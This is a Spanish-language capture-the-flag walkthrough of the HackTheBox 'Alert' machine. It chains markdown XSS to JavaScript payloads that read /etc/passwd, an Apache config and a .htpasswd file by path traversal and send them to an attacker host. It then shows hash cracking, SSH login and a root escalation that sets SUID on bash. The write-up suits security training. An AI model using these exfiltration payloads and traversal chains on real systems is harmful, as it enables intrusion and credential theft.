## Alert

---

![Logo](images/00_logo_alert.png)

###### Técnicas demostradas:

- XSS - Injection Via Markdown
- Discovering LFI accessible from XSS
- Cracking Hashes
- Exploiting Web Service Executed by Root
- Creating a Malicious php File in Writable Path (Privilege Escalation)

---

En primer lugar realizamos un escaneo de puertos para recopilar cuáles están abiertos.

```bash
nmap -p- open -sS --min-rate 5000 -vvv -Pn 10.10.11.44 -oG allPorts
```

![Escaneo de puertos abiertos](images/01_nmap1_alert.png)

Con la herramienta `ExtractPorts` definida en nuestro sistema copiamos los puertos abiertos a la clipboard

```bash
extractPorts allports
```

![Extracción de puertos](images/02_extraccion_alert.png)

Realizamos un escaneo más exhaustivo de los puertos para conocer el servicio y la versión que está corriendo en ellos.

```bash
nmap -p22,80 -sCV 10.10.11.44 -oN targeted
```

![Escaneo de servicios y versiones](images/03_nmap2_alert.png)

Con la herramienta `WhatWeb` terminamos de recopilar información que nos pueda ser de ayuda.

![Whatweb](images/04_whatweb_alert.png)

Una vez añadido el dominio a nuestro archivo `/etc/hosts` realizamos una inspección de la web para ver a qué nos enfrentamos.

![Primer vistazo a la web](images/05_web1_alert.png)

Probamos realizar un ataque de inyección LaTeX pero no tenemos éxito.

![Inyección LaTeX](images/06_LaTeX_alert.png)

Si revisamos el apartado "About Us" vemos que nos indican que el administrador del sitio revisa los mensajes del apartado "Contact" esto es importante.

![Sección About Us](images/07_aboutus_alert.png)

Vamos a realizar un descubrimiento de directorios con la herramienta `gobuster` en busca de archivos con extensión `.php`

```bash
gobuster dir -u http://alert.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```

![Listando directorios con Gobuster](images/08_gobuster1_alert.png)

Revisamos que tenemos en `/messages.php`

![Vistazo a messages.php](images/09_messagesphp1_alert.png)

Tras no ver nada, vamos a realizar un escaneo de subdominios con `wffuz`

```bash
wfuzz -c --hc 301 -t 20 /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.alert.htb" alert.htb
```

![Listando subdominios con Wfuzz](images/10_wfuzz1_alert.png)

Encontramos un subdominio `statistics.alert.htb` lo añadimos a nuestro archivo `/etc/hosts`

![Fichero hosts](images/11_etchosts_alert.png)

Tras revisarlo vemos que tenemos un panel de autenticación.

![Panel de autenticación](images/12_autenticaion_alert.png)

En este punto vamos a revisar si la web es vulnerable a un ataque XSS para markdown, con ayuda de la web [XSS in Markdown - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html) preparamos nuestro payload.

```markdown
<!-- XSS with regular tags -->
<script>
  alert(1)
</script>
<img src="x" onerror="alert(1)" />
```

Una vez subido el archivo al panel, vemos que sí.

![Resultado de prueba XSS](images/13_XSS1_alert.png)

Sabiendo esto, vamos a adaptar nuestro payload para que la web cargue un recurso en nuestra máquina que vamos a llamar `pwned.js` Esto lo haremos cargando en el archivo markdown una llamada al fichero, como sabemos que el administrador está revisando los mensajes que le enviamos a través del panel de "Contact Us" cargaremos el enlace que nos proporciona el visualizador de la web para pasárselo al administrador, por detrás estaremos a la escucha en nuestra máquina para recoger la petición.

```markdown
<script src="http://10.10.14.9:3000/pwned.js"></script>
```

```bash
nc -nlvp 3000
```

![Petición del servidor](images/14_respuesta_alert.png)

![Respuesta de visualizer.php](images/15_respuesta1_alert.png)

Esta es la URL que nos devuelve el visualizador de la web. Vamos a pasársela por mensaje al administrador del sitio.

```url
http://alert.htb/visualizer.php?link_share=680f57d0974c63.17343056.md
```

![Mensaje al admin a través de Contact Us](images/16_contactus_alert.png)

A su vez vamos a ponernos a la escucha en nuestra máquina para recoger la petición.

```bash
python3 -m http.server 3000
```

Este será el contenido del fichero `pwned.js`, la idea es traernos el contenido en `php` del panel `messages.php`

```javascript
var req = new XMLHttpRequest();
req.open("GET", "http://alert.htb/messages.php", false);
req.send();
var req2 = new XMLHttpRequest();
req2.open(
  "GET",
  "http://10.10.14.9:3000/?content=" + btoa(req.responseText),
  true
);
req2.send();
```

Una vez tenemos la respuesta debemos descifrarla en `base64`

![Respuesta de contenido](images/17_messagesphp_content_alert.png)

```bash
echo "[...]" | base64 -d
```

![Decodificación del contenido](images/18_contentmessagesphp_alert.png)

Tras acceder no vemos nada.

![Comprobando en navegador](images/19_accesofichero_alert.png)

En este punto y sabiendo que este método funciona, vamos a tratar de modificar nuestro payload para realizar un `LFI` y leer el fichero `/etc/passwd`

```javascript
var req = new XMLHttpRequest();
req.open(
  "GET",
  "http://alert.htb/messages.php?file=../../../../../etc/passwd",
  false
);
req.send();
var req2 = new XMLHttpRequest();
req2.open(
  "GET",
  "http://10.10.14.9:3000/?content=" + btoa(req.responseText),
  true
);
req2.send();
```

```bash
python3 -m http.server 3000
```

![LFI Path Traversal /etc/passwd](images/20_passwd_alert.png)

```bash
echo "[...]" | base64 -d
```

Tras decodificar la respuesta vemos que tenemos dos usuarios.

![Fichero /etc/passwd](images/21_decodepasswd_alert.png)

Anteriormente, descubrimos `statistics.alert.htb` , que solicita autenticación. Intentaremos leer el archivo de configuración de `Apache`.

```javascript
var req = new XMLHttpRequest();
req.open(
  "GET",
  "http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf",
  false
);
req.send();
var req2 = new XMLHttpRequest();
req2.open(
  "GET",
  "http://10.10.14.9:3000/?content=" + btoa(req.responseText),
  true
);
req2.send();
```

```bash
python3 -m http.server 3000
```

![Respuesta con la config de Apache](images/22_apacheconf_alert.png)

```bash
echo "PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg==" | base64 -d
```

Realizamos la decodificación. Y observamos que disponemos del fichero `.htpasswd`

![Decode apache config](images/23_decode_htpasswd_alert.png)

Modificaremos nuestro payload para tratar de leerlo.

```javascript
var req = new XMLHttpRequest();
req.open(
  "GET",
  "http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd",
  false
);
req.send();
var req2 = new XMLHttpRequest();
req2.open(
  "GET",
  "http://10.10.14.9:3000/?content=" + btoa(req.responseText),
  true
);
req2.send();
```

```bash
python3 -m http.server 3000
```

![Respuesta con contenido de .htpasswd](images/24_htpasswd_alert.png)

Tras decodificarlo obtenemos un hash.

```bash
echo "[...]" | base64 -d
```

![Hash de usuario](images/25_hashuser_alert.png)

`$apr1$` revela que el hash utilizado es MD5, el cual crackearemos utilizando `Hashcat`. Guadamos el hash obtenido en un fichero `data`.

```bash
hashcat -a 0 -m 1600 data /usr/share/wordlists/rockyou.txt
```

![Hascat](images/26_hashcat_crack_alert.png)

Después de realizar el proceso obtenemos la contraseña del usuario. Probamos a ingresar en el panel que encontramos anteriormente. Observamos un dashboard, pero por el momento no podemos hacer nada más aquí.

![Acceso a panel](images/27_accesopanel_alert.png)

En este punto vamos a probar el acceso vía `ssh` con las credenciales que tenemos.

```bash
ssh usuario@10.10.11.44
```

![Acceso SSH](images/28_sshaccess_alert.png)

Encontramos la primera flag en el directorio personal del usuario.

![Flag user.txt](images/29_userflag_alert.png)

#### Escalada de privilegios

En primer lugar vamos a revisar los servicios que están corriendo.

```bash
netstat -tulnp
```

![Netstat](images/30_netstat_alert.png)

Nos conectamos de nuevo a la máquina haciendo un `port-forwarding` del puerto 8080

```bash
ssh albert@alert.htb -L 8080:127.0.0.1:8080
```

En este punto vamos a descargar la herramienta `pspy` https://github.com/DominicBreuker/pspy?tab=readme-ov-file para revisar todo. Montaremos un servidor http con Python y descargaremos la herramienta en la máquina víctima.

```bash
python3 -m http.server 4000
```

```bash
wget http://10.10.14.9:4000/pspy64
```

![Descargando PsPy](images/31_movepspy_alert.png)

Cambiamos los permisos para poder ejecutarlo.

Observamos que se está ejecutando `monitor.php` con el `UID=0`

![Revisando procesos con PsPy](images/32_monitorphp_alert.png)

Vamos a revisar su contenido.

```bash
cat /opt/website-monitor/monitor.php
```

Observamos que el fichero hace una llamada a otro `configuration.php` este puede ser interesante, vamos a revisarlo.

![monitor.php](images/33_configurationphp_alert.png)

```bash
cd /opt/website-monitor/
ls -la
```

![monitor.php](images/34_websitemonitor_content_alert.png)

```bash
cd /config
ls -la
```

Observamos que el fichero pertenece al grupo `management` por lo que podemos modificarlo para añadir `SUID` a la `bash`

![Revisando permisos](images/35_permconfigurationphp_alert.png)

```bash
nano configuration.php
```

![Asignando SUID a bash](images/36_SUIDbash_alert.png)

Una vez hecho podremos escalar a `root`

```bash
/bin/bash -p
```

![Consiguiendo acceso a root](images/37_priviledgeescalation_alert.png)

![Flag root.txt](images/38_root_flag_alert.png)
